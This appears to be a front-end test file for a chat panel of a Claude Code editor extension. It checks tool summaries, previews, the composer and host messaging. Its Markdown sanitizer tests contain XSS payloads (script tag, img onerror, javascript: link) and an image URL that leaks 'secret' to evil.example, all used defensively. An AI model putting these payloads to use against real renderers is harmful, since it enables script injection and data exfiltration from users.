import { act, render, screen, fireEvent } from '@testing-library/react';
import userEvent from '@testing-library/user-event';
import { describe, expect, test, vi } from 'vitest';
import type { HostToWebview, WebviewCommand } from '../../protocol/src/index';
import { App } from './App';
import type { HostApi } from './host';
import { Composer } from './components/Composer';
import { Markdown } from './components/Markdown';
import { MessageList } from './components/MessageList';
import { Thinking, thinkingLabel } from './components/Thinking';
import { ToolCard } from './components/ToolCard';
import type { Item } from './state';
import { resultPreview, toolSummary } from './toolSummary';

function fakeHost() {
  const posted: WebviewCommand[] = [];
  let listener: ((m: HostToWebview) => void) | null = null;
  const host: HostApi = {
    post: (c) => posted.push(c),
    subscribe: (fn) => { listener = fn; return () => { listener = null; }; },
  };
  const push = (m: HostToWebview) => act(() => listener!(m));
  return { host, posted, push };
}

describe('toolSummary', () => {
  test('file tools show the full path', () => {
    expect(toolSummary('Read', { file_path: 'C:\\src\\App\\Program.cs' })).toBe('C:\\src\\App\\Program.cs');
    expect(toolSummary('Write', { file_path: 'C:\\a\\b.cs' })).toBe('C:\\a\\b.cs');
    expect(toolSummary('Edit', { file_path: '/repo/src/x.ts' })).toBe('/repo/src/x.ts');
    expect(toolSummary('NotebookRead', { notebook_path: 'C:\\n\\a.ipynb' })).toBe('C:\\n\\a.ipynb');
  });
  test('long paths are not shortened', () => {
    const path = 'C:\\' + 'deep\\'.repeat(40) + 'file.cs';
    expect(toolSummary('Read', { file_path: path })).toBe(path);
  });
  test('search tools show the quoted pattern', () => {
    expect(toolSummary('Grep', { pattern: 'TODO' })).toBe('pattern: "TODO"');
    expect(toolSummary('Glob', { pattern: '**/*.cs' })).toBe('pattern: "**/*.cs"');
  });
  test('shell tools show the command', () => {
    expect(toolSummary('Bash', { command: 'git status' })).toBe('git status');
    expect(toolSummary('PowerShell', { command: 'Get-ChildItem' })).toBe('Get-ChildItem');
  });
  test('web tools show the query or url', () => {
    expect(toolSummary('WebSearch', { query: 'vs sdk' })).toBe('query: "vs sdk"');
    expect(toolSummary('WebFetch', { url: 'https://example.com/a' })).toBe('https://example.com/a');
  });
  test('other tools fall back to a descriptive field', () => {
    expect(toolSummary('Task', { description: 'Find callers' })).toBe('Find callers');
    expect(toolSummary('LS', { path: 'C:\\src' })).toBe('C:\\src');
  });
  test('long values are shortened', () => {
    expect(toolSummary('Bash', { command: 'x'.repeat(200) }).length).toBe(120);
    expect(toolSummary('Grep', { pattern: 'x'.repeat(200) })).toBe('pattern: "' + 'x'.repeat(119) + '…"');
  });
  test('unknown input gives empty summary', () => expect(toolSummary('X', undefined)).toBe(''));
});

describe('resultPreview', () => {
  test('shows the first non-empty line', () => expect(resultPreview('Bash', '\n  \n  On branch main  \nnothing to commit')).toBe('On branch main'));
  test('long lines are cut to 120 characters', () => {
    const p = resultPreview('Grep', 'y'.repeat(300))!;
    expect(p.length).toBe(120);
    expect(p.endsWith('…')).toBe(true);
  });
  test('file reads have no preview', () => {
    expect(resultPreview('Read', 'class A {}')).toBeUndefined();
    expect(resultPreview('NotebookRead', 'cells')).toBeUndefined();
  });
  test('missing or blank results have no preview', () => {
    expect(resultPreview('Bash', undefined)).toBeUndefined();
    expect(resultPreview('Bash', ' \n\n')).toBeUndefined();
  });
});

describe('Thinking', () => {
  test('label shows progress while streaming and the rounded duration after', () => {
    expect(thinkingLabel({ startedAt: 1000 })).toBe('Thinking…');
    expect(thinkingLabel({ startedAt: 1000, endedAt: 4200 })).toBe('Thought for 3s');
    expect(thinkingLabel({ startedAt: 1000, endedAt: 1100 })).toBe('Thought for 1s');
  });

  test('collapsed by default; clicking toggles the thinking text', async () => {
    render(<Thinking item={{ kind: 'thinking', id: 't', text: 'pondering', startedAt: 0, endedAt: 2000 }} />);
    expect(screen.queryByText('pondering')).toBeNull();
    await userEvent.click(screen.getByRole('button', { name: 'Thought for 2s' }));
    expect(screen.getByText('pondering')).toBeInTheDocument();
    await userEvent.click(screen.getByRole('button', { name: 'Thought for 2s' }));
    expect(screen.queryByText('pondering')).toBeNull();
  });
});

describe('Markdown', () => {
  test('markdown does not render raw html', () => {
    const { container } = render(<Markdown text={'**bold** <script>window.x = 1</script><img src="x" onerror="alert(1)">'} />);
    expect(container.querySelector('script')).toBeNull();
    expect(container.querySelector('img')).toBeNull();
    expect(screen.getByText('bold').tagName).toBe('STRONG');
  });

  test('remote images render as links, never as images', () => {
    const { container } = render(<Markdown text={'![chart](https://evil.example/?d=secret)'} />);
    expect(container.querySelector('img')).toBeNull();
    const link = screen.getByRole('link', { name: 'chart' });
    expect(link).toHaveAttribute('href', 'https://evil.example/?d=secret');
  });

  test('non-http images render as their alt text only', () => {
    const { container } = render(<Markdown text={'![local pic](file:///C:/x.png)'} />);
    expect(container.querySelector('img')).toBeNull();
    expect(container.querySelector('a')).toBeNull();
    expect(screen.getByText('local pic')).toBeInTheDocument();
  });

  test('javascript: links lose their href', () => {
    const { container } = render(<Markdown text={'[x](javascript:alert(1))'} />);
    for (const a of container.querySelectorAll('a')) expect(a.getAttribute('href') ?? '').not.toMatch(/javascript:/i);
  });

  test('code blocks get a copy button', () => {
    render(<Markdown text={'```csharp\nvar x = 1;\n```'} />);
    expect(screen.getByRole('button', { name: 'Copy code' })).toBeInTheDocument();
  });
});

describe('ToolCard', () => {
  test('collapsed shows name and summary; expanding shows input, output and truncation', async () => {
    render(<ToolCard item={{ kind: 'tool', id: 'k', toolUseId: 'tu', name: 'Read', input: { file_path: 'C:\\a\\b.cs' }, result: 'contents', truncated: true, status: 'ok' }} />);
    expect(screen.getByText('Read')).toBeInTheDocument();
    expect(screen.getByText('C:\\a\\b.cs')).toBeInTheDocument();
    expect(screen.queryByText('contents')).toBeNull();
    await userEvent.click(screen.getByRole('button', { expanded: false }));
    expect(screen.getByText('contents')).toBeInTheDocument();
    expect(screen.getByText('Output truncated')).toBeInTheDocument();
  });

  test('shows a one-line result preview under the header', () => {
    render(<ToolCard item={{ kind: 'tool', id: 'k', toolUseId: 'tu', name: 'Bash', input: { command: 'git status' }, result: 'On branch main\nclean', status: 'ok' }} />);
    const preview = screen.getByText('On branch main');
    expect(preview).toHaveClass('tool-preview');
    expect(preview).not.toHaveClass('tool-preview-error');
  });

  test('an errored tool shows its preview as an error', () => {
    render(<ToolCard item={{ kind: 'tool', id: 'k', toolUseId: 'tu', name: 'Bash', input: { command: 'x' }, result: 'command not found', status: 'error' }} />);
    expect(screen.getByText('command not found')).toHaveClass('tool-preview-error');
  });
});

describe('MessageList', () => {
  const time = (ms: number) => new Date(ms).toLocaleTimeString([], { hour: 'numeric', minute: '2-digit' });
  const items: Item[] = [
    { kind: 'user', id: 'u1', text: 'question', at: Date.UTC(2026, 0, 1, 9, 5) },
    { kind: 'thinking', id: 't1', text: 'hmm', startedAt: 0, endedAt: 1000, at: Date.UTC(2026, 0, 1, 9, 7) },
    { kind: 'text', id: 'x1', text: 'answer' },
  ];

  test('reply items sit on a timeline; the user message does not', () => {
    const { container } = render(<MessageList items={items} running={false} />);
    expect(container.querySelectorAll('.timeline > .tl-row')).toHaveLength(2);
    expect(container.querySelector('.timeline .user-msg')).toBeNull();
    expect(screen.getByText('question')).toHaveClass('user-msg');
  });

  test('user messages and replies show their time', () => {
    render(<MessageList items={items} running={false} />);
    expect(screen.getByText(time(items[0].at!))).toHaveClass('timestamp');
    expect(screen.getByText(time(items[1].at!))).toHaveClass('timestamp');
  });
});

describe('Composer', () => {
  test('Enter sends and clears; Shift+Enter does not send', async () => {
    const onSend = vi.fn();
    render(<Composer running={false} disabled={false} onSend={onSend} onStop={() => {}} />);
    const box = screen.getByRole('textbox', { name: 'Message' });
    await userEvent.type(box, 'line one{Shift>}{Enter}{/Shift}line two');
    expect(onSend).not.toHaveBeenCalled();
    await userEvent.type(box, '{Enter}');
    expect(onSend).toHaveBeenCalledWith('line one\nline two');
    expect(box).toHaveValue('');
  });

  test('composer prompts with a short placeholder and no key hint', () => {
    render(<Composer running={false} disabled={false} onSend={() => {}} onStop={() => {}} />);
    expect(screen.getByPlaceholderText('Ask Claude…')).toBeInTheDocument();
    expect(screen.queryByText(/Enter to send/)).toBeNull();
    expect(screen.getByRole('button', { name: 'Send' })).toBeDisabled();
  });

  test('composer shows stop while running and does not send', async () => {
    const onSend = vi.fn();
    const onStop = vi.fn();
    render(<Composer running={true} disabled={false} onSend={onSend} onStop={onStop} />);
    const box = screen.getByRole('textbox', { name: 'Message' });
    await userEvent.type(box, 'again{Enter}');
    expect(onSend).not.toHaveBeenCalled();
    expect(box).toHaveValue('again');
    await userEvent.click(screen.getByRole('button', { name: 'Stop' }));
    fireEvent.keyDown(box, { key: 'Escape' });
    expect(onStop).toHaveBeenCalledTimes(2);
  });
});

describe('App', () => {
  test('announces itself, then shows the empty state once connected', () => {
    const { host, posted, push } = fakeHost();
    render(<App host={host} />);
    expect(posted).toEqual([{ t: 'webview_ready' }]);
    push({ t: 'status', state: 'connected' });
    expect(screen.getByText(/Ask Claude about this solution/)).toBeInTheDocument();
  });

  test('sending posts to the host and renders streamed reply', async () => {
    const { host, posted, push } = fakeHost();
    render(<App host={host} />);
    push({ t: 'status', state: 'connected' });
    await userEvent.type(screen.getByRole('textbox', { name: 'Message' }), 'hi{Enter}');
    expect(posted).toContainEqual({ t: 'send', text: 'hi' });
    push({ t: 'block_start', key: 'm:0', kind: 'text' });
    push({ t: 'block_delta', key: 'm:0', text: 'Hello **there**' });
    push({ t: 'turn_end', status: 'success' });
    expect(screen.getByText('there').tagName).toBe('STRONG');
  });

  test('setup card retry posts reconnect', async () => {
    const { host, posted, push } = fakeHost();
    render(<App host={host} />);
    push({ t: 'error', code: 'claude_not_found', message: 'Claude Code was not found.' });
    expect(screen.getByText('Claude Code needed')).toBeInTheDocument();
    await userEvent.click(screen.getByRole('button', { name: 'Retry' }));
    expect(posted).toContainEqual({ t: 'reconnect' });
  });

  test('an untrusted folder shows the trust setup card', async () => {
    const { host, posted, push } = fakeHost();
    render(<App host={host} />);
    push({ t: 'error', code: 'untrusted_folder', message: "This folder hasn't been trusted in Claude Code yet." });
    expect(screen.getByText('Trust this folder first')).toBeInTheDocument();
    await userEvent.click(screen.getByRole('button', { name: 'Retry' }));
    expect(posted).toContainEqual({ t: 'reconnect' });
  });

  test('new conversation clears the transcript and posts new_session', async () => {
    const { host, posted, push } = fakeHost();
    render(<App host={host} />);
    push({ t: 'status', state: 'connected' });
    await userEvent.type(screen.getByRole('textbox', { name: 'Message' }), 'hi{Enter}');
    push({ t: 'turn_end', status: 'success' });
    await userEvent.click(screen.getByRole('button', { name: 'New conversation' }));
    expect(posted).toContainEqual({ t: 'new_session' });
    expect(screen.queryByText('hi')).toBeNull();
  });

  test('theme variables are applied to the document', () => {
    const { host, push } = fakeHost();
    render(<App host={host} />);
    push({ t: 'theme', vars: { '--vsc-bg': '#F5F5F5' } });
    expect(document.documentElement.style.getPropertyValue('--vsc-bg')).toBe('#F5F5F5');
    expect(document.documentElement.dataset.theme).toBe('light');
  });
});
